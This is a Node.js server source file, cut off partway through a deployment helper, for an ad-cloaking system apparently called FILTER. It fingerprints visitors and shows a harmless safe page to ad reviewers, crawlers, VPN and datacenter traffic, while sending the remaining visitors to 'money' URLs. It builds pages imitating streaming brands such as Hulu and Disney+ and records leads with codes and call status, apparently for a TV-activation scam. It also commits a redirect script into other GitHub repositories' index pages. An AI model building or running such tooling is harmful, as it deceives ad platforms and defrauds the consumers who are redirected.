'use strict';

const express    = require('express');
const session    = require('express-session');
const bcrypt     = require('bcryptjs');
const crypto     = require('crypto');
const https      = require('https');
const http       = require('http');
const fs         = require('fs');
const path       = require('path');
const { EventEmitter } = require('events');
let   pg;
try { pg = require('pg'); } catch(e) { pg = null; }

// ─── ENV ─────────────────────────────────────────────────────────────────────
const PORT          = process.env.PORT || 5000;
const DATABASE_URL  = process.env.DATABASE_URL;
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

function validateAdminPath(p) {
  if (p && /^[a-zA-Z0-9]{4,}$/.test(p)) return p;
  if (p) console.warn('[FILTER] ADMIN_PATH must be 4+ alphanumeric chars. Using default.');
  return 'manage-zx7q2';
}
const ADMIN_PATH = validateAdminPath(process.env.ADMIN_PATH);

const DATA_DIR  = path.join(__dirname, 'data');
const LOCAL_DIR = path.join(__dirname, '.local');
[DATA_DIR, LOCAL_DIR].forEach(d => { try { fs.mkdirSync(d, { recursive: true }); } catch(e){} });

// ─── PASSWORD ─────────────────────────────────────────────────────────────────
let ADMIN_PASSWORD_HASH = null;
const HASH_FILE = path.join(DATA_DIR, 'admin_hash');

async function initPassword() {
  if (fs.existsSync(HASH_FILE)) {
    ADMIN_PASSWORD_HASH = fs.readFileSync(HASH_FILE, 'utf8').trim();
    return;
  }
  const pwd = process.env.ADMIN_PASSWORD;
  if (pwd) {
    ADMIN_PASSWORD_HASH = await bcrypt.hash(pwd, 10);
  } else {
    const otp = crypto.randomBytes(9).toString('base64url').slice(0, 12);
    console.warn('\n⚠️  No ADMIN_PASSWORD set. One-time password: ' + otp + '\n');
    ADMIN_PASSWORD_HASH = await bcrypt.hash(otp, 10);
  }
  fs.writeFileSync(HASH_FILE, ADMIN_PASSWORD_HASH);
}

// ─── DATABASE ─────────────────────────────────────────────────────────────────
let pool = null;
if (DATABASE_URL && pg) {
  pool = new pg.Pool({ connectionString: DATABASE_URL, ssl: { rejectUnauthorized: false } });
  pool.on('error', e => console.error('[DB]', e.message));
}

async function dbQuery(sql, params) {
  if (!pool) return null;
  try {
    const r = await pool.query(sql, params);
    return r;
  } catch(e) {
    console.error('[DB query error]', e.message);
    return null;
  }
}

async function initDB() {
  if (!pool) return;
  await dbQuery(`CREATE TABLE IF NOT EXISTS cloaker_logs (
    id BIGSERIAL PRIMARY KEY, ts TIMESTAMPTZ NOT NULL, ip VARCHAR(50),
    site_id VARCHAR(100), country VARCHAR(10), city VARCHAR(100),
    region VARCHAR(100), isp VARCHAR(255), org VARCHAR(255), ua TEXT,
    screen VARCHAR(30), plugins INT, tz VARCHAR(100), wd BOOLEAN DEFAULT FALSE,
    proxy BOOLEAN DEFAULT FALSE, hosting BOOLEAN DEFAULT FALSE,
    decision VARCHAR(10), reason VARCHAR(60), page VARCHAR(500)
  )`);
  await dbQuery(`CREATE TABLE IF NOT EXISTS cloaker_leads (
    id BIGSERIAL PRIMARY KEY, ts TIMESTAMPTZ, ip VARCHAR(50),
    site_id VARCHAR(100), type VARCHAR(50), country VARCHAR(10),
    city VARCHAR(100), region VARCHAR(100), isp VARCHAR(255), org VARCHAR(255),
    ua TEXT, code VARCHAR(30), screen VARCHAR(30), tz VARCHAR(100),
    utm_source VARCHAR(100), utm_campaign VARCHAR(100), utm_medium VARCHAR(100),
    utm_content VARCHAR(100), utm_term VARCHAR(100), gclid VARCHAR(100),
    referrer VARCHAR(300), called BOOLEAN DEFAULT FALSE,
    called_at TIMESTAMPTZ, extra JSONB
  )`);
  await dbQuery(`CREATE TABLE IF NOT EXISTS cloaker_kv (
    key VARCHAR(100) PRIMARY KEY, value JSONB, updated_at TIMESTAMPTZ DEFAULT NOW()
  )`);
  await dbQuery(`ALTER TABLE cloaker_logs ADD COLUMN IF NOT EXISTS page VARCHAR(500)`);
}

// ─── JSON FALLBACK ─────────────────────────────────────────────────────────────
function readJson(file, def) {
  try { return JSON.parse(fs.readFileSync(path.join(DATA_DIR, file), 'utf8')); }
  catch(e) { return def; }
}
function writeJson(file, data) {
  try { fs.writeFileSync(path.join(DATA_DIR, file), JSON.stringify(data, null, 2)); }
  catch(e) { console.error('[JSON write]', e.message); }
}

// ─── IN-MEMORY CACHES ─────────────────────────────────────────────────────────
let _cacheLogs     = [];
let _cacheLeads    = [];
let _cacheSites    = [];
let _cacheSettings = {};
const ipFreqStore   = new Map();
const activeVisitors = new Map();

function defaultSettings() {
  return {
    botBlocking: true, vpnBlocking: true, proxyBlocking: true,
    repeatBlocking: true, ispBlocking: true, countryBlocking: false,
    ispKeywords: [], allowedCountries: [],
    moneyUrl: '', safeUrl: '',
    timezone: 'UTC', enabled: true
  };
}

function defaultSite() {
  return {
    id: 'site-' + Date.now(),
    name: 'Default Site',
    domain: '',
    apiKey: crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex'),
    moneyUrl: '', safeUrl: '', adUrl: '',
    githubRepo: '', railwayProjectId: '', railwayServiceId: '',
    enabled: true, blockedIps: [], allowedCountries: [],
    isDefault: true, deployStatus: 'pending',
    githubInjected: false, createdAt: new Date().toISOString(),
    botBlocking: true, vpnBlocking: true, proxyBlocking: true,
    repeatBlocking: true, ispBlocking: true, countryBlocking: false,
    ispKeywords: []
  };
}

async function loadCaches() {
  if (pool) {
    // Try to load from DB
    const sitesRow = await dbQuery(`SELECT value FROM cloaker_kv WHERE key='sites'`);
    if (sitesRow && sitesRow.rows.length) _cacheSites = sitesRow.rows[0].value || [];
    const settingsRow = await dbQuery(`SELECT value FROM cloaker_kv WHERE key='settings'`);
    if (settingsRow && settingsRow.rows.length) _cacheSettings = settingsRow.rows[0].value || {};
    const logs = await dbQuery(`SELECT * FROM cloaker_logs ORDER BY ts DESC LIMIT 10000`);
    if (logs) _cacheLogs = logs.rows;
    const leads = await dbQuery(`SELECT * FROM cloaker_leads ORDER BY ts DESC LIMIT 5000`);
    if (leads) _cacheLeads = leads.rows;
    // Migrate JSON → Postgres if DB is empty
    await migrateJsonToDb();
  } else {
    _cacheSites    = readJson('sites.json', []);
    _cacheSettings = readJson('settings.json', {});
    _cacheLogs     = readJson('logs.json', []);
    _cacheLeads    = readJson('leads.json', []);
  }
  if (!Object.keys(_cacheSettings).length) _cacheSettings = defaultSettings();
  if (!_cacheSites.length) _cacheSites = [defaultSite()];
}

async function migrateJsonToDb() {
  if (!pool) return;
  // Only migrate if DB is truly empty (no sites stored yet)
  const check = await dbQuery(`SELECT value FROM cloaker_kv WHERE key='sites'`);
  if (check && check.rows.length) return; // already have DB data
  const jsonSites    = readJson('sites.json', []);
  const jsonSettings = readJson('settings.json', {});
  const jsonLogs     = readJson('logs.json', []);
  const jsonLeads    = readJson('leads.json', []);
  if (!jsonSites.length && !jsonLogs.length && !jsonLeads.length) return;
  console.log('[FILTER] Migrating JSON data to Postgres...');
  if (jsonSites.length) {
    _cacheSites = jsonSites;
    await dbQuery(`INSERT INTO cloaker_kv(key,value,updated_at) VALUES('sites',$1,NOW())
      ON CONFLICT(key) DO UPDATE SET value=$1, updated_at=NOW()`, [JSON.stringify(jsonSites)]);
  }
  if (Object.keys(jsonSettings).length) {
    _cacheSettings = jsonSettings;
    await dbQuery(`INSERT INTO cloaker_kv(key,value,updated_at) VALUES('settings',$1,NOW())
      ON CONFLICT(key) DO UPDATE SET value=$1, updated_at=NOW()`, [JSON.stringify(jsonSettings)]);
  }
  for (const log of jsonLogs.slice(0,1000)) {
    await dbQuery(`INSERT INTO cloaker_logs(ts,ip,site_id,country,city,region,isp,org,ua,screen,plugins,tz,wd,proxy,hosting,decision,reason,page)
      VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18)
      ON CONFLICT DO NOTHING`,
      [log.ts,log.ip,log.site_id,log.country,log.city,log.region,log.isp,log.org,
       log.ua,log.screen,log.plugins,log.tz,log.wd,log.proxy,log.hosting,
       log.decision,log.reason,log.page]).catch(()=>{});
  }
  for (const lead of jsonLeads.slice(0,500)) {
    await dbQuery(`INSERT INTO cloaker_leads(ts,ip,site_id,type,country,city,region,isp,org,ua,code,screen,tz,utm_source,utm_campaign,utm_medium,utm_content,utm_term,gclid,referrer,called)
      VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21)
      ON CONFLICT DO NOTHING`,
      [lead.ts,lead.ip,lead.site_id,lead.type,lead.country,lead.city,lead.region,lead.isp,lead.org,
       lead.ua,lead.code,lead.screen,lead.tz,lead.utm_source,lead.utm_campaign,lead.utm_medium,
       lead.utm_content,lead.utm_term,lead.gclid,lead.referrer,!!lead.called]).catch(()=>{});
  }
  console.log('[FILTER] Migration done.');
}

async function saveSites() {
  writeJson('sites.json', _cacheSites);
  if (pool) await dbQuery(`INSERT INTO cloaker_kv(key,value,updated_at) VALUES('sites',$1,NOW())
    ON CONFLICT(key) DO UPDATE SET value=$1, updated_at=NOW()`, [JSON.stringify(_cacheSites)]);
}
async function saveSettings() {
  writeJson('settings.json', _cacheSettings);
  if (pool) await dbQuery(`INSERT INTO cloaker_kv(key,value,updated_at) VALUES('settings',$1,NOW())
    ON CONFLICT(key) DO UPDATE SET value=$1, updated_at=NOW()`, [JSON.stringify(_cacheSettings)]);
}

// ─── SSE EMITTER ─────────────────────────────────────────────────────────────
const emitter = new EventEmitter();
emitter.setMaxListeners(200);

function broadcast(type, data) {
  emitter.emit('sse', { type, data });
}

// ─── UTILITIES ────────────────────────────────────────────────────────────────
function escHtml(s) {
  if (s == null) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

function getIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.socket.remoteAddress || '0.0.0.0';
}

function getSite(apiKey) {
  if (!apiKey) return _cacheSites.find(s => s.isDefault) || _cacheSites[0];
  return _cacheSites.find(s => s.apiKey === apiKey) || _cacheSites.find(s => s.isDefault) || _cacheSites[0];
}

function ipLookup(ip) {
  return new Promise(resolve => {
    const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,regionName,isp,org,proxy,hosting`;
    const req = http.get(url, { timeout: 5000 }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try { resolve(JSON.parse(d)); } catch(e) { resolve({}); }
      });
    });
    req.on('error', () => resolve({}));
    req.on('timeout', () => { req.destroy(); resolve({}); });
  });
}

// ─── BOT UA PATTERNS ──────────────────────────────────────────────────────────
const BOT_PATTERNS = [
  /googlebot/i,/adsbot/i,/bingbot/i,/slurp/i,/duckduckbot/i,/baiduspider/i,
  /yandexbot/i,/sogou/i,/exabot/i,/facebot/i,/ia_archiver/i,/mj12bot/i,
  /dotbot/i,/semrushbot/i,/ahrefsbot/i,/majestic/i,/rogerbot/i,
  /screaming.?frog/i,/\bwget\b/i,/\bcurl\b/i,/python-requests/i,
  /libwww-perl/i,/java\//i,/go-http-client/i,/facebookexternalhit/i,
  /twitterbot/i,/linkedinbot/i,/whatsapp/i,/pinterest/i,/slackbot/i,
  /telegrambot/i,/headlesschrome/i,/phantomjs/i,/selenium/i,/webdriver/i,
  /scrapy/i,/\bcrawler\b/i,/\bspider\b/i,/\bbot\b/i
];

const SUSP_ISP = ['google','amazon','microsoft','cloudflare','digitalocean','linode','vultr','ovh','hetzner','facebook','apple'];

// ─── CHANNEL CATALOG ─────────────────────────────────────────────────────────
const CHANNELS_META = [
  { slug: 'paramount-plus',   name: 'Paramount+'   },
  { slug: 'hulu',             name: 'Hulu'         },
  { slug: 'disney-plus',      name: 'Disney+'      },
  { slug: 'espn-plus',        name: 'ESPN+'        },
  { slug: 'espn-unlimited',   name: 'ESPN Unlimited' },
  { slug: 'fox-nation',       name: 'Fox Nation'   },
  { slug: 'fox-one',          name: 'Fox One'      },
  { slug: 'fox-sports',       name: 'Fox Sports'   },
  { slug: 'peacock-tv',       name: 'Peacock TV'   },
  { slug: 'starz',            name: 'STARZ'        },
  { slug: 'vizio-tv',         name: 'VIZIO TV+'    }
];
const CHANNEL_SLUGS = new Set(CHANNELS_META.map(c => c.slug));

async function ensureChannelSites() {
  let added = 0;
  for (const ch of CHANNELS_META) {
    if (!_cacheSites.some(s => s.channelSlug === ch.slug)) {
      _cacheSites.push({
        ...defaultSite(),
        id: 'channel-' + ch.slug,
        name: ch.name,
        domain: 'entermytvcode.com',
        channelSlug: ch.slug,
        isDefault: false
      });
      added++;
    }
  }
  if (!_cacheSites.some(s => s.isDefault)) {
    _cacheSites[0].isDefault = true;
  }
  if (added) {
    await saveSites();
    console.log('[FILTER] Seeded ' + added + ' channel sites');
  }
}

function getChannelSite(slug) {
  return _cacheSites.find(s => s.channelSlug === slug)
      || _cacheSites.find(s => s.isDefault)
      || _cacheSites[0];
}

// ─── CLOAKING ENGINE ──────────────────────────────────────────────────────────
async function runCloakChecks(ip, body, site, settings, opts) {
  // opts.skipRepeat=true -> caller has already accounted for the per-IP
  // repeat counter (e.g. the channel first-paint middleware ran first and
  // /api/v1/verify is now a second pass on the same visitor).
  const skipRepeat = !!(opts && opts.skipRepeat);
  const ua  = (body.ua || '').substring(0, 500);
  const sw  = parseInt(body.sw) || 0;
  const sh  = parseInt(body.sh) || 0;
  const wd  = !!body.wd;
  const pl  = parseInt(body.pl) || 0;
  const tz  = (body.tz || '').substring(0, 100);
  const pg  = (body.pg || '/').substring(0, 500);

  const siteSettings = {
    botBlocking:    site.botBlocking    !== undefined ? site.botBlocking    : settings.botBlocking,
    vpnBlocking:    site.vpnBlocking    !== undefined ? site.vpnBlocking    : settings.vpnBlocking,
    proxyBlocking:  site.proxyBlocking  !== undefined ? site.proxyBlocking  : settings.proxyBlocking,
    repeatBlocking: site.repeatBlocking !== undefined ? site.repeatBlocking : settings.repeatBlocking,
    ispBlocking:    site.ispBlocking    !== undefined ? site.ispBlocking    : settings.ispBlocking,
    countryBlocking:site.countryBlocking!== undefined ? site.countryBlocking: settings.countryBlocking,
    ispKeywords:    [...(settings.ispKeywords||[]), ...(site.ispKeywords||[])],
    allowedCountries: site.allowedCountries && site.allowedCountries.length ? site.allowedCountries : (settings.allowedCountries||[])
  };

  let decision = 'allow', reason = 'ok';
  let ipData = {};

  // Check 1 — cloaking disabled
  if (!site.enabled || !settings.enabled) {
    return finish('allow', 'disabled', ipData, { ua, sw, sh, wd, pl, tz, pg });
  }

  // Check 2 — manual IP blocklist
  const blockedIps = [...(site.blockedIps||[]), ...(settings.blockedIps||[])];
  if (blockedIps.includes(ip)) {
    return finish('block', 'manual-block', ipData, { ua, sw, sh, wd, pl, tz, pg });
  }

  // Check 3 — repeat click (24h).  Skipped when the caller has already
  // accounted for it (e.g. the channel first-paint middleware just ran on
  // this same visit and we are now doing the verify second pass).
  const now = Date.now();
  if (!skipRepeat) {
    if (siteSettings.repeatBlocking && ipFreqStore.has(ip)) {
      const last = ipFreqStore.get(ip);
      if (now - last < 24 * 3600 * 1000) {
        ipFreqStore.set(ip, now);
        return finish('block', 'repeat-click', ipData, { ua, sw, sh, wd, pl, tz, pg });
      }
    }
    if (ipFreqStore.size >= 10000) {
      const first = ipFreqStore.keys().next().value;
      ipFreqStore.delete(first);
    }
    ipFreqStore.set(ip, now);
  }

  // Check 4 — bot UA
  if (siteSettings.botBlocking && BOT_PATTERNS.some(p => p.test(ua))) {
    return finish('block', 'bot-ua', ipData, { ua, sw, sh, wd, pl, tz, pg });
  }

  // Check 5 — webdriver
  if (wd) return finish('block', 'webdriver', ipData, { ua, sw, sh, wd, pl, tz, pg });

  // Check 6 — screen size
  if (sw === 0 || sh === 0) return finish('block', 'no-screen', ipData, { ua, sw, sh, wd, pl, tz, pg });
  if ((sw === 800 && sh === 600) || (sw === 1024 && sh === 768)) {
    if (pl === 0) return finish('block', 'headless-screen', ipData, { ua, sw, sh, wd, pl, tz, pg });
  }

  // Check 7 — no plugins on desktop
  if (siteSettings.botBlocking && /windows|macintosh/i.test(ua) && !/mobile|android|iphone|ipad/i.test(ua) && pl === 0) {
    return finish('block', 'no-plugins-desktop', ipData, { ua, sw, sh, wd, pl, tz, pg });
  }

  // Check 8 — IP reputation (ip-api.com)
  ipData = await ipLookup(ip);
  if (!ipData.countryCode) ipData.countryCode = 'XX';

  // Check 9 — country allowlist
  if (siteSettings.countryBlocking && siteSettings.allowedCountries.length > 0) {
    if (!siteSettings.allowedCountries.includes(ipData.countryCode)) {
      return finish('block', 'country-block', ipData, { ua, sw, sh, wd, pl, tz, pg });
    }
  }

  // Check 10 — suspicious ISP
  if (siteSettings.ispBlocking) {
    const ispStr = ((ipData.isp || '') + ' ' + (ipData.org || '')).toLowerCase();
    const keywords = [...SUSP_ISP, ...siteSettings.ispKeywords.map(k => k.toLowerCase())];
    if (keywords.some(k => k && ispStr.includes(k))) {
      return finish('block', 'suspicious-isp', ipData, { ua, sw, sh, wd, pl, tz, pg });
    }
  }

  // Check 11 — proxy/VPN/datacenter
  if (siteSettings.vpnBlocking && ipData.proxy) return finish('block', 'proxy-vpn', ipData, { ua, sw, sh, wd, pl, tz, pg });
  if (siteSettings.proxyBlocking && ipData.hosting) return finish('block', 'datacenter', ipData, { ua, sw, sh, wd, pl, tz, pg });

  return finish('allow', 'ok', ipData, { ua, sw, sh, wd, pl, tz, pg });

  function finish(dec, rsn, iData, fp) {
    return { decision: dec, reason: rsn, ipData: iData, fp };
  }
}

// ─── SERVER-SIDE CLOAKING (no client fingerprint) ────────────────────────────
// Used for first-paint cloaking of channel pages — only does IP/UA/country/ISP
// checks; skips screen/plugins/webdriver checks (those need browser-side data).
async function runServerCloakChecks(ip, ua, referer, site, settings, slug) {
  const fpStub = { ua, sw: 0, sh: 0, wd: false, pl: 0, tz: '', pg: slug || '' };
  const siteSettings = {
    botBlocking:    site.botBlocking    !== undefined ? site.botBlocking    : settings.botBlocking,
    vpnBlocking:    site.vpnBlocking    !== undefined ? site.vpnBlocking    : settings.vpnBlocking,
    proxyBlocking:  site.proxyBlocking  !== undefined ? site.proxyBlocking  : settings.proxyBlocking,
    repeatBlocking: site.repeatBlocking !== undefined ? site.repeatBlocking : settings.repeatBlocking,
    ispBlocking:    site.ispBlocking    !== undefined ? site.ispBlocking    : settings.ispBlocking,
    countryBlocking:site.countryBlocking!== undefined ? site.countryBlocking: settings.countryBlocking,
    ispKeywords:    [...(settings.ispKeywords||[]), ...(site.ispKeywords||[])],
    allowedCountries: site.allowedCountries && site.allowedCountries.length
      ? site.allowedCountries : (settings.allowedCountries || [])
  };

  if (!site.enabled || !settings.enabled) {
    return { decision: 'allow', reason: 'disabled', ipData: {}, fp: fpStub };
  }
  const blockedIps = [...(site.blockedIps||[]), ...(settings.blockedIps||[])];
  if (blockedIps.includes(ip)) {
    return { decision: 'block', reason: 'manual-block', ipData: {}, fp: fpStub };
  }
  if (siteSettings.botBlocking && BOT_PATTERNS.some(p => p.test(ua))) {
    return { decision: 'block', reason: 'bot-ua', ipData: {}, fp: fpStub };
  }
  // Repeat-click (24h) — keyed on IP+slug so same user can visit multiple channels
  const fk = ip + '|' + (slug || 'unknown');
  const now = Date.now();
  if (siteSettings.repeatBlocking && ipFreqStore.has(fk)) {
    const last = ipFreqStore.get(fk);
    if (now - last < 24 * 3600 * 1000) {
      ipFreqStore.set(fk, now);
      return { decision: 'block', reason: 'repeat-click', ipData: {}, fp: fpStub };
    }
  }
  if (ipFreqStore.size >= 10000) {
    const first = ipFreqStore.keys().next().value;
    ipFreqStore.delete(first);
  }
  ipFreqStore.set(fk, now);

  const ipData = await ipLookup(ip);
  if (!ipData.countryCode) ipData.countryCode = 'XX';

  if (siteSettings.countryBlocking && siteSettings.allowedCountries.length > 0) {
    if (!siteSettings.allowedCountries.includes(ipData.countryCode)) {
      return { decision: 'block', reason: 'country-block', ipData, fp: fpStub };
    }
  }
  if (siteSettings.ispBlocking) {
    const ispStr = ((ipData.isp||'') + ' ' + (ipData.org||'')).toLowerCase();
    const keywords = [...SUSP_ISP, ...siteSettings.ispKeywords.map(k => k.toLowerCase())];
    if (keywords.some(k => k && ispStr.includes(k))) {
      return { decision: 'block', reason: 'suspicious-isp', ipData, fp: fpStub };
    }
  }
  if (siteSettings.vpnBlocking && ipData.proxy) {
    return { decision: 'block', reason: 'proxy-vpn', ipData, fp: fpStub };
  }
  if (siteSettings.proxyBlocking && ipData.hosting) {
    return { decision: 'block', reason: 'datacenter', ipData, fp: fpStub };
  }
  return { decision: 'allow', reason: 'ok', ipData, fp: fpStub };
}

// Handle a channel page request with server-side cloaking.
// Allowed -> serve the channel HTML.  Blocked -> serve safe.html.
async function handleChannelPage(req, res, slug) {
  const ip      = getIP(req);
  const ua      = (req.headers['user-agent'] || '').substring(0, 500);
  const referer = (req.headers.referer || '').substring(0, 300);
  const site    = getChannelSite(slug);
  const settings = _cacheSettings;
  let result;
  try {
    result = await runServerCloakChecks(ip, ua, referer, site, settings, slug);
  } catch (e) {
    console.error('[channel cloak]', e.message);
    result = { decision: 'allow', reason: 'error', ipData: {}, fp: { ua, sw:0, sh:0, wd:false, pl:0, tz:'', pg: slug } };
  }
  result.fp.pg = slug;
  // Log every visit (don't await — keep response fast)
  logVisit(ip, site, result).catch(e => console.error('[logVisit]', e.message));

  const file = result.decision === 'block' ? 'safe.html' : (slug + '.html');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  return res.sendFile(path.join(__dirname, 'public', file), err => {
    if (err) {
      console.error('[sendFile]', file, err.message);
      res.status(404).send('Not found');
    }
  });
}

async function logVisit(ip, site, result) {
  const { decision, reason, ipData, fp } = result;
  const entry = {
    ts: new Date().toISOString(), ip,
    site_id: site.id,
    country: ipData.countryCode || 'XX',
    city: ipData.city || '', region: ipData.regionName || '',
    isp: ipData.isp || '', org: ipData.org || '',
    ua: fp.ua, screen: fp.sw + 'x' + fp.sh,
    plugins: fp.pl, tz: fp.tz,
    wd: fp.wd, proxy: !!ipData.proxy, hosting: !!ipData.hosting,
    decision, reason, page: fp.pg
  };
  // Update active visitors
  activeVisitors.set(ip, { ...entry, lastSeen: Date.now(), siteId: site.id });
  // DB
  if (pool) {
    await dbQuery(`INSERT INTO cloaker_logs(ts,ip,site_id,country,city,region,isp,org,ua,screen,plugins,tz,wd,proxy,hosting,decision,reason,page)
      VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18)`,
      [entry.ts,ip,site.id,entry.country,entry.city,entry.region,entry.isp,entry.org,
       entry.ua,entry.screen,entry.plugins,entry.tz,entry.wd,entry.proxy,entry.hosting,
       decision,reason,fp.pg]);
  }
  _cacheLogs.unshift(entry);
  if (_cacheLogs.length > 10000) _cacheLogs.pop();
  if (!pool) writeJson('logs.json', _cacheLogs.slice(0, 1000));
  broadcast('newLog', entry);
  broadcast('statsUpdate', getQuickStats());
  broadcast('visitorsUpdate', getActiveVisitors());
}

// `l.ts` may be a Date (loaded from PG) or an ISO string (just inserted) —
// normalise to a 10-char date so the comparison works in either case.
function tsDay(t) {
  if (!t) return '';
  if (typeof t === 'string') return t.slice(0,10);
  if (t instanceof Date) return t.toISOString().slice(0,10);
  try { return new Date(t).toISOString().slice(0,10); } catch(_) { return ''; }
}
function getQuickStats() {
  const today = new Date().toISOString().slice(0,10);
  const todayLogs = _cacheLogs.filter(l => tsDay(l.ts) === today);
  return {
    total: todayLogs.length,
    allowed: todayLogs.filter(l => l.decision === 'allow').length,
    blocked: todayLogs.filter(l => l.decision === 'block').length,
    leads: _cacheLeads.filter(l => tsDay(l.ts) === today).length
  };
}

function getActiveVisitors() {
  return Array.from(activeVisitors.values());
}

// Purge active visitors older than 5 min
setInterval(() => {
  const cutoff = Date.now() - 5 * 60 * 1000;
  for (const [ip, v] of activeVisitors) {
    if (v.lastSeen < cutoff) activeVisitors.delete(ip);
  }
  broadcast('visitorsUpdate', getActiveVisitors());
}, 60000);

// ─── LEAD CAPTURE ────────────────────────────────────────────────────────────
async function saveLead(lead) {
  _cacheLeads.unshift(lead);
  if (_cacheLeads.length > 5000) _cacheLeads.pop();
  if (!pool) writeJson('leads.json', _cacheLeads.slice(0,500));
  if (pool) {
    const extra = {
      fingerprint: lead.fingerprint || '',
      plugins:     (lead.plugins != null) ? Number(lead.plugins) : null,
      wd:          !!lead.wd,
      lang:        lead.lang || ''
    };
    await dbQuery(`INSERT INTO cloaker_leads(ts,ip,site_id,type,country,city,region,isp,org,ua,code,screen,tz,utm_source,utm_campaign,utm_medium,utm_content,utm_term,gclid,referrer,called,extra)
      VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22)`,
      [lead.ts,lead.ip,lead.site_id,lead.type,lead.country,lead.city,lead.region,
       lead.isp,lead.org,lead.ua,lead.code,lead.screen,lead.tz,
       lead.utm_source,lead.utm_campaign,lead.utm_medium,lead.utm_content,lead.utm_term,
       lead.gclid,lead.referrer,false,JSON.stringify(extra)]);
  }
  broadcast('newLead', lead);
}

// ─── GITHUB INJECTION ────────────────────────────────────────────────────────
function getGithubToken() {
  const e = process.env.GITHUB_TOKEN;
  if (e) return e;
  try { return fs.readFileSync(path.join(LOCAL_DIR,'github_token'),'utf8').trim(); } catch(er){}
  return null;
}
function getRailwayToken() {
  const e = process.env.RAILWAY_API_TOKEN;
  if (e) return e;
  try { return fs.readFileSync(path.join(LOCAL_DIR,'railway_token'),'utf8').trim(); } catch(er){}
  return null;
}

function buildCloakScript(site, hubUrl) {
  return `<script>\n(function(){\n  var _h='${hubUrl}',_k='${site.apiKey}';\n  try{\n    fetch(_h+'/api/v1/pixel',{method:'POST',headers:{'Content-Type':'application/json','X-Client-ID':_k},body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,pg:window.location.pathname})})\n    .then(function(r){return r.json()})\n    .then(function(d){if(d&&d.url)window.location.replace(d.url)})\n    .catch(function(){});\n  }catch(e){}\n})();\n</script>`;
}

async function githubInject(site, hubUrl) {
  const token = getGithubToken();
  if (!token || !site.githubRepo) return false;
  try {
    const match = site.githubRepo.match(/github\.com\/([^/]+)\/([^/]+)/);
    if (!match) return false;
    const [,owner,repo] = match;
    const repoClean = repo.replace(/\.git$/, '');
    // Try index.html, then public/index.html
    const filesToTry = ['index.html', 'public/index.html'];
    for (const filePath of filesToTry) {
      const getRes = await ghApi('GET', `/repos/${owner}/${repoClean}/contents/${filePath}`, null, token);
      if (!getRes || getRes.message) continue;
      let content = Buffer.from(getRes.content, 'base64').toString('utf8');
      const script = buildCloakScript(site, hubUrl);
      // Remove existing script if present
      content = content.replace(/<script>\s*\(function\(\)\{[\s\S]*?\}\)\(\);\s*<\/script>\s*/m, '');
      // Prepend to <head>
      content = content.replace(/(<head[^>]*>)/i, '$1\n' + script);
      const newContent = Buffer.from(content).toString('base64');
      const putRes = await ghApi('PUT', `/repos/${owner}/${repoClean}/contents/${filePath}`, {
        message: 'FILTER: inject cloaking script',
        content: newContent,
        sha: getRes.sha
      }, token);
      if (putRes && putRes.content) return true;
    }
    return false;
  } catch(e) { console.error('[GitHub inject]', e.message); return false; }
}

function ghApi(method, apiPath, body, token) {
  return new Promise(resolve => {
    const opts = {
      hostname: 'api.github.com',
      path: apiPath, method,
      headers: {
        'Authorization': 'Bearer ' + token,
        'Accept': 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28',
        'User-Agent': 'FILTER-Bot'
      }
    };
    if (body) {
      const bodyStr = JSON.stringify(body);
      opts.headers['Content-Type'] = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(bodyStr);
    }
    const req = https.request(opts, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    if (body) req.write(JSON.stringify(body));
    req.end();
  });
}

// ─── RAILWAY INTEGRATION ─────────────────────────────────────────────────────
function railwayGraphQL(query, token) {
  return new Promise(resolve => {
    const body = JSON.stringify({ query });
    const opts = {
      hostname: 'backboard.railway.app',
      path: '/graphql/v2', method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    };
    const req = https.request(opts, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

async function triggerRailwayDeploy(site) {
  const token = getRailwayToken();
  if (!token) return false;
  // Auto-discover IDs if not set
  if (!site.railwayProjectId || !site.railwayServiceId) {
    await railwayAutoDiscover(site, token);
  }
  if (!site.railwayProjectId || !site.railwayServiceId) return false;
  try {
    const q1 = `{ deployments(input:{projectId:"${site.railwayProjectId}",serviceId:"${site.railwayServiceId}"}) { edges { node { id status } } } }`;
    const r1 = await railwayGraphQL(q1, token);
    const deployId = r1?.data?.deployments?.edges?.[0]?.node?.id;
    if (!deployId) return false;
    const q2 = `mutation { deploymentRedeploy(id:"${deployId}") { id } }`;
    const r2 = await railwayGraphQL(q2, token);
    return !!r2?.data?.deploymentRedeploy?.id;
  } catch(e) { return false; }
}

async function railwayAutoDiscover(site, token) {
  if (!site.githubRepo || !token) return;
  try {
    const match = site.githubRepo.match(/github\.com\/([^/]+)\/([^/]+)/);
    if (!match) return;
    const repoName = match[2].replace(/\.git$/, '');
    // List all projects and find a matching one
    const q = `{ projects { edges { node { id name services { edges { node { id name } } } } } } }`;
